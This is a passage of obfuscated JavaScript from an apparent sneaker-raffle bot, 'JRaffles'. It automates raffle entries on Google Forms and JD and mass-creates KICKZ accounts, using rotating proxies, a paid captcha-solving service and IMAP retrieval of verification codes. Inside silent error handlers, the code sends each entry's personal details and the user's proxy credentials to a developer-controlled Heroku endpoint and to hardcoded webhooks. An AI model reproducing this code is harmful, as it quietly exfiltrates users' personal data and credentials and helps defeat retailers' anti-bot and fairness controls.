                                    _0x1f7031 && await _0x1f7031['type']('' + _0x1f8349[_0x52adf2]['' + _0x1166a3[_0x44232d['input']]]), _0x5b4e7c && await _0x5b4e7c['type']('' + _0x1f8349[_0x52adf2]['' + _0x1166a3[_0x44232d['input']]]), await _0x73bf2c(0x258);
                                }
                                await _0x58657b(), await _0x73bf2c(0x37a);
                            }
                            let _0x2b480c = await _0x51aeab['$']('div[jsname=\x22OCpkoe\x22]');
                            if (_0x2b480c)
                                return await _0x2b480c['click'](), await _0x51aeab['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x4262e3('New\x20Section'), _0x45b3d0();
                        }
                        await _0x45b3d0(), await _0x51aeab['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x51aeab['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x5584d0(_0x1f8349[_0x52adf2], _0x4df6e0), _0xd915e8 = 'no';
                        var _0x5a49d3 = await _0x1bd114(_0x1f8349[_0x52adf2], _0x4df6e0, 'dev', ![]), _0x4812d3 = await _0x1bd114(_0x1f8349[_0x52adf2], _0x4df6e0, 'pub', ![]);
                        let _0x39c9ac = _0x1f8349[_0x52adf2];
                        try {
                            prxdata = {
                                'username': _0x5c7ae6['replace']('#', ''),
                                'module': _0x4df6e0['name'],
                                'entrydata': JSON['stringify'](_0x39c9ac),
                                'proxy': '' + _0x4cc6c1[_0x52adf2]
                            };
                            var _0x287820 = JSON['stringify'](prxdata);
                            let _0x1635aa = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x287820, _0x1635aa);
                        } catch (_0x457bb5) {
                        }
                        const _0x4624b7 = {
                            'succesDEVMSG': { 'embeds': [_0x5a49d3] },
                            'succesPUBMSG': { 'embeds': [_0x4812d3] }
                        };
                        try {
                            _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x4624b7['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x4624b7['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x4624b7['succesPUBMSG']);
                        } catch (_0x56bf0f) {
                            console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x52adf2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x56bf0f));
                        }
                        console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x4df6e0['name'] + ']\x20Task\x20' + (_0x52adf2 + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x469193 != 0x0 || _0x46f821 != 0x0 && !_0x1cec56) && (_0x39c579['push'](_0x4cf3c8), _0x57b36f['writeFileSync']('forms/templates.json', JSON['stringify'](_0x39c579, null, 0x2), 'utf-8'));
                    } catch (_0x2d1187) {
                        console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4df6e0['name'] + ']\x20Task\x20' + (_0x52adf2 + 0x1) + '\x20:\x20' + _0x2d1187)), _0x4e9897 = '' + _0x2d1187;
                        var _0x5f2eb1 = await _0x1bd114(_0x1f8349[_0x52adf2], _0x4df6e0, 'dev', !![], _0x4e9897);
                        let _0x5f159d = {};
                        _0x5f159d['errorDEV'] = { 'embeds': [_0x5f2eb1] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x5f159d['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x5f159d['errorDEV']), _0xd915e8 = 'yes';
                    } finally {
                        _0x35779d && _0x35779d['close']();
                        if (_0xd915e8 == 'yes' && _0x58e551 != 0x5) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4df6e0['name'] + ']\x20Task\x20' + (_0x52adf2 + 0x1) + '\x20:\x20Retrying\x20(' + (_0x58e551 + 0x1) + '\x20/\x205)')), _0x52adf2--, _0x58e551++;
                            continue;
                        }
                        if (_0xd915e8 == 'yes' && _0x58e551 == 0x5) {
                            _0x58e551 = 0x0, _0xd915e8 = 'no';
                            continue;
                        }
                        _0x4262e3('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x4d3e98, _0x20b8d0, _0x7bd5fd) {
                var _0x17434e = ![], _0xef71e8 = ![];
                if (_0x1d78d4['captchaKey'] == '' || _0x1d78d4['captchaKey'] == undefined)
                    return console['log'](_0x11085b['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1d78d4['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5ad161 = 0x0; _0x5ad161 < _0x20b8d0['length']; _0x5ad161++) {
                    if (_0x2336cc != 'yes')
                        var _0x2336cc = '', _0x4acd43 = 0x0;
                    var _0x13f126, _0x2a2fee = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x20b8d0[_0x5ad161]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x20b8d0[_0x5ad161]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5c7ae6
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1d78d4['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x152cdf
                            }
                        ]
                    }];
                    const _0x524413 = { 'embeds': _0x2a2fee };
                    _0x3ec78c(_0x4d3e98['name'] + '\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20/\x20' + _0x20b8d0['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                    try {
                        await _0x4b6344(_0x20b8d0, _0x5ad161);
                    } catch {
                        _0x2336cc = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x1ac1b7 = await _0x1bd114(_0x20b8d0[_0x5ad161], _0x4d3e98, 'dev', ![]), _0x24e3ff = await _0x1bd114(_0x20b8d0[_0x5ad161], _0x4d3e98, 'pub', ![]);
                    const _0x2bf456 = {
                        'succesDEVMSG': { 'embeds': [_0x1ac1b7] },
                        'succesPUBMSG': { 'embeds': [_0x24e3ff] }
                    };
                    if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                        try {
                            await _0x5cd94d(_0x1d78d4['webhook'], _0x2bf456['succesDEVMSG']);
                        } catch {
                        }
                    await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x2bf456['succesDEVMSG']), await _0x73bf2c(0xc8);
                    try {
                        await _0x5cd94d(_0x323e07, _0x2bf456['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x20b8d0[_0x5ad161]['Email'] == '' || _0x20b8d0[_0x5ad161]['Url'] == '' || _0x20b8d0[_0x5ad161]['FirstName'] == '' || _0x20b8d0[_0x5ad161]['LastName'] == '') {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1d78d4['useRandomProxy'] = ![])
                        var _0x86bc0c = _0x7bd5fd[_0x5ad161]['split'](':');
                    else
                        var _0x1b8cdf = Math['round'](Math['random']() * (_0x7bd5fd['length'] - 0x1)), _0x86bc0c = _0x7bd5fd[_0x1b8cdf]['split'](':');
                    var _0x25bf7f;
                    try {
                        _0x25bf7f = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x86bc0c[0x0] + ':' + _0x86bc0c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x25bf7f = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x86bc0c[0x0] + ':' + _0x86bc0c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x26df7e = await _0x25bf7f['newPage']();
                        await _0x26df7e['authenticate']({
                            'username': '' + _0x86bc0c[0x2],
                            'password': '' + _0x86bc0c[0x3]
                        }), console['log'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26df7e['setRequestInterception'](!![]), _0x26df7e['on']('request', _0x274097 => {
                            _0x274097['resourceType']() === 'image' || _0x274097['resourceType']() === 'font' || _0x274097['resourceType']() === 'media' ? _0x274097['abort']() : _0x274097['continue']();
                        });
                        try {
                            await _0x26df7e['goto']('' + _0x20b8d0[_0x5ad161]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x26df7e['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x26df7e['type']('#comp_firstname', '' + _0x20b8d0[_0x5ad161]['FirstName']), await _0x26df7e['waitForSelector']('#comp_lastname'), await _0x26df7e['type']('#comp_lastname', '' + _0x20b8d0[_0x5ad161]['LastName']), await _0x26df7e['waitForSelector']('#comp_email'), await _0x26df7e['type']('#comp_email', '' + _0x20b8d0[_0x5ad161]['Email']), await _0x26df7e['waitForSelector']('#comp_paypalemail'), await _0x26df7e['type']('#comp_paypalemail', '' + _0x20b8d0[_0x5ad161]['Email']), await _0x26df7e['waitForSelector']('#comp_mobile_end'), await _0x26df7e['type']('#comp_mobile_end', '' + _0x20b8d0[_0x5ad161]['Phone']), await _0x26df7e['waitForSelector']('#comp_dob'), await _0x26df7e['type']('#comp_dob', '08/09/1992'), console['log'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x20b8d0[_0x5ad161]['Size'] == 'RANDOM') {
                            const _0x15a5cb = await _0x26df7e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xe73479 => {
                                return _0xe73479['map'](_0x1df8d4 => _0x1df8d4['value']);
                            });
                            var _0x1f8861 = Math['round'](Math['random']() * (_0x15a5cb['length'] - 0x2));
                            await _0x26df7e['select']('#shoesize', _0x15a5cb[_0x1f8861 + 0x1]), await _0x73bf2c(0x3e8);
                        } else {
                            const _0x3730b6 = await _0x26df7e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x37a03b => {
                                return _0x37a03b['map'](_0x4418d8 => _0x4418d8['innerText']);
                            }), _0x30c21c = await _0x26df7e['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x42c1f2 => {
                                return _0x42c1f2['map'](_0x23622b => _0x23622b['value']);
                            });
                            var _0x43c068 = _0x20b8d0[_0x5ad161]['Size'];
                            for (var _0x2c21b5 = 0x1; _0x2c21b5 < _0x30c21c['length']; _0x2c21b5++) {
                                var _0x234a35 = _0x3730b6[_0x2c21b5]['split']('\x20')[0x0];
                                if (_0x234a35 == _0x43c068) {
                                    await _0x26df7e['select']('#shoesize', _0x30c21c[_0x2c21b5]);
                                    break;
                                } else {
                                    if (_0x2c21b5 + 0x1 == _0x30c21c['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x26df7e['waitForSelector']('#comp_address1'), await _0x26df7e['type']('#comp_address1', _0x20b8d0[_0x5ad161]['Address1'] + '\x20' + _0x20b8d0[_0x5ad161]['HouseNumber']), await _0x26df7e['waitForSelector']('#comp_address2'), await _0x26df7e['type']('#comp_address2', '' + _0x20b8d0[_0x5ad161]['Address2']), await _0x26df7e['waitForSelector']('#comp_address2'), await _0x26df7e['type']('#comp_address3', '' + _0x20b8d0[_0x5ad161]['City']), await _0x26df7e['waitForSelector']('#comp_postcode'), await _0x26df7e['type']('#comp_postcode', '' + _0x20b8d0[_0x5ad161]['Zip']), console['log'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x73bf2c(0x4b0), await _0x26df7e['click']('label#emailhold'), await _0x73bf2c(0x5dc), await _0x26df7e['click']('#preauth_tandc_email\x20>\x20label'), await _0x73bf2c(0x5dc), await _0x26df7e['click']('#submit');
                        try {
                            await _0x26df7e['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20' + _0x11085b['blue']('Awaiting\x20Paypal\x20Payment')), _0x25bf7f['on']('targetcreated', async _0x57f597 => {
                            if (_0x57f597['type']() === 'page') {
                                const _0x5a9b31 = await _0x57f597['page']();
                                async function _0x256610() {
                                    try {
                                        await _0x26df7e['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0xef71e8 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x1477ea() {
                                    try {
                                        await _0x26df7e['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x17434e = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x1477ea(), _0x256610(), await _0x73bf2c(0x493e0);
                            }
                        });
                        async function _0x482476() {
                            for (let _0x5759d6 = 0x0; _0x5759d6 < 0x12c; _0x5759d6++) {
                                if (_0x17434e == !![]) {
                                    _0x2336cc = 'no', _0x5584d0(_0x20b8d0[_0x5ad161], _0x4d3e98), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                        try {
                                            await _0x5cd94d(_0x1d78d4['webhook'], _0x2bf456['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x2bf456['succesDEVMSG']), await _0x73bf2c(0xc8);
                                    try {
                                        await _0x5cd94d(_0x323e07, _0x2bf456['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0xef71e8)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x73bf2c(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x73bf2c(0xbb8), await _0x26df7e['click']('.zoid-outlet'), await _0x73bf2c(0x7d0), await _0x482476();
                    } catch (_0x11f554) {
                        console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20' + _0x11f554)), _0x13f126 = '' + _0x11f554;
                        var _0x1fa9e0 = await _0x1bd114(_0x20b8d0[_0x5ad161], _0x4d3e98, 'dev', !![], _0x13f126);
                        _0x2bf456['errorDEV'] = { 'embeds': [_0x1fa9e0] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x2bf456['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x2bf456['errorDEV']);
                    } finally {
                        _0x25bf7f && _0x25bf7f['close']();
                        if (_0x2336cc == 'yes' && _0x4acd43 != 0x5 && _0x13f126 != 'Size\x20Not\x20Found') {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4d3e98['name'] + ']\x20Task\x20' + (_0x5ad161 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4acd43 + '\x20/\x205)')), _0x5ad161 = _0x5ad161 - 0x1, _0x4acd43 = _0x4acd43 + 0x1;
                            continue;
                        }
                        _0x2336cc == 'yes' && _0x4acd43 >= 0x5 && (_0x3fe3d2(afew[_0x5ad161], _0x4d3e98), _0x2336cc = 'no', _0x4acd43 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x5ca3b7, _0x5928e7, _0x91a70b) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x454909 = 0x0; _0x454909 < _0x5928e7['length']; _0x454909++) {
                        const _0x48dd18 = 'https://www.kickz.com/login';
                        if (_0x25dc75 != 'yes')
                            var _0x25dc75 = '', _0x28a705 = 0x0;
                        _0x3ec78c(_0x5ca3b7['name'] + '\x20Task\x20' + (_0x454909 + 0x1) + '\x20/\x20' + _0x5928e7['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        try {
                            await _0x4b6344(_0x5928e7, _0x454909);
                        } catch {
                            _0x25dc75 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0xdb48eb = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5c7ae6
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1d78d4['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x152cdf
                                }
                            ]
                        }];
                        const _0x2b9539 = { 'embeds': _0xdb48eb };
                        var _0xe018b2 = await _0x1bd114(_0x5928e7[_0x454909], _0x5ca3b7, 'acc', ![]);
                        const _0x2cbafe = { 'succesDEVMSG': { 'embeds': [_0xe018b2] } };
                        if (_0x5928e7[_0x454909]['Email'] == '' || _0x5928e7[_0x454909]['FirstName'] == '' || _0x5928e7[_0x454909]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5928e7[_0x454909]['Password'] == '' && (_0x5928e7[_0x454909]['Password'] = 'JRaffles23!');
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x1c0f84 = _0x91a70b[_0x454909]['split'](':');
                        else
                            var _0x3ddf29 = Math['round'](Math['random']() * (_0x91a70b['length'] - 0x1)), _0x1c0f84 = _0x91a70b[_0x3ddf29]['split'](':');
                        var _0x5b7f39;
                        try {
                            _0x5b7f39 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c0f84[0x0] + ':' + _0x1c0f84[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5b7f39 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x1c0f84[0x0] + ':' + _0x1c0f84[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x127de6 = await _0x5b7f39['newPage']();
                            await _0x127de6['authenticate']({
                                'username': '' + _0x1c0f84[0x2],
                                'password': '' + _0x1c0f84[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x127de6['setRequestInterception'](!![]), _0x127de6['on']('request', _0x3b191a => {
                                _0x3b191a['resourceType']() === 'image' || _0x3b191a['resourceType']() === 'font' || _0x3b191a['resourceType']() === 'media' ? _0x3b191a['abort']() : _0x3b191a['continue']();
                            }), await _0x127de6['goto'](_0x48dd18), await _0x73bf2c(0xbb8), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x127de6['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x127de6['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x127de6['waitForSelector']('#button-register'), await _0x73bf2c(0x7d0), await _0x127de6['evaluate'](() => {
                                const _0x3b134a = document['querySelector']('#button-register');
                                _0x3b134a['click']();
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x73bf2c(0x1388), await _0x127de6['waitForSelector']('#customer_salutation'), await _0x127de6['select']('#customer_salutation', 'mr'), await _0x73bf2c(0x7d0), await _0x127de6['waitForSelector']('#customer_firstname'), await _0x127de6['type']('#customer_firstname', '' + _0x5928e7[_0x454909]['FirstName']), await _0x73bf2c(0x352), await _0x127de6['waitForSelector']('#customer_lastname'), await _0x127de6['type']('#customer_lastname', '' + _0x5928e7[_0x454909]['LastName']), await _0x73bf2c(0x352), await _0x127de6['type']('#email-input', '' + _0x5928e7[_0x454909]['Email']), await _0x73bf2c(0x352), await _0x127de6['type']('#email-confirm-input', '' + _0x5928e7[_0x454909]['Email']), await _0x73bf2c(0x352), await _0x127de6['type']('#register-password', '' + _0x5928e7[_0x454909]['Password']), await _0x73bf2c(0x352), await _0x127de6['type']('#password-confirm', '' + _0x5928e7[_0x454909]['Password']), await _0x73bf2c(0x352), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x127de6['click']('#consent'), await _0x73bf2c(0x1f4);
                            const _0x3235bc = await _0x127de6['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x3235bc) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x127de6['click']('#buttonRegister');
                            try {
                                await _0x127de6['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5928e7[_0x454909]['Email']), await _0x73bf2c(0x4b0);
                            async function _0x453b09() {
                                var _0xc1d15e, _0x1a6b07 = ![];
                                for (var _0x5afd94 = 0x0; _0x5afd94 < 0x18; _0x5afd94++) {
                                    async function _0x1ed2d3() {
                                        var _0x9a2c02 = new _0x10db71({
                                            'user': _0x1d78d4['masterMail'],
                                            'password': _0x1d78d4['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x1d3b42(_0x4100e1) {
                                            _0x9a2c02['openBox']('INBOX', ![], _0x4100e1);
                                        }
                                        _0x9a2c02['once']('ready', function () {
                                            console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x1d3b42(function (_0x3595de, _0x4cebfd) {
                                                console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x3595de)
                                                    throw _0x3595de;
                                                _0x9a2c02['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x33e078, _0x282ccc) {
                                                    if (!_0x282ccc || !_0x282ccc['length'])
                                                        console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x9a2c02['end']();
                                                    else {
                                                        var _0x5541a3 = _0x9a2c02['seq']['fetch'](_0x282ccc, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x5541a3['on']('message', function (_0x2ac970, _0x112835) {
                                                            var _0x137959 = '(#' + _0x112835 + ')\x20';
                                                            _0x2ac970['on']('body', function (_0x2a643c, _0x21537a) {
                                                                _0xd18e10(_0x2a643c, (_0x401b95, _0xc34047) => {
                                                                    if (_0xc34047['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x280b7d = _0xc34047['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x3c0cbc = _0x280b7d[0x1]['split']('<')[0x0];
                                                                        _0xc1d15e = _0x3c0cbc;
                                                                    }
                                                                });
                                                            }), _0x2ac970['once']('end', function () {
                                                            });
                                                        }), _0x5541a3['once']('error', function (_0xd552ad) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x5541a3['once']('end', function () {
                                                            _0x9a2c02['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x9a2c02['once']('error', function (_0x3821ca) {
                                            console['log'](_0x11085b['red'](_0x3821ca['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1a6b07 = !![];
                                        }), _0x9a2c02['once']('end', async function () {
                                        }), _0x9a2c02['connect']();
                                    }
                                    _0x1ed2d3(), await _0x73bf2c(0x1388);
                                    if (_0xc1d15e)
                                        return _0xc1d15e;
                                    if (_0x1a6b07)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5afd94 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x453b09(), _0x73bf2c(0x320), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Verifying..'), await _0x127de6['type']('#verificationCode', code), await _0x73bf2c(0x1f4), await _0x127de6['click']('#buttonVerify'), await _0x73bf2c(0x190), await _0x127de6['click']('#buttonVerify'), await _0x73bf2c(0x3e8);
                            try {
                                await _0x127de6['waitForSelector']('div.b-user_greeting'), _0x25dc75 = 'no', console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Account\x20' + _0x5928e7[_0x454909]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x57b36f['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5928e7[_0x454909]['Email'] + ',' + _0x5928e7[_0x454909]['Password'] + ','), console['log'](_0x4ea3c7() + '\x20[' + _0x5ca3b7['name'] + ']\x20Task\x20' + (_0x454909 + 0x1) + '\x20:\x20Account\x20' + _0x5928e7[_0x454909]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x2cbafe['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5cd94d(_0x2ffc54, _0x2cbafe['succesDEVMSG']);
                            } catch {
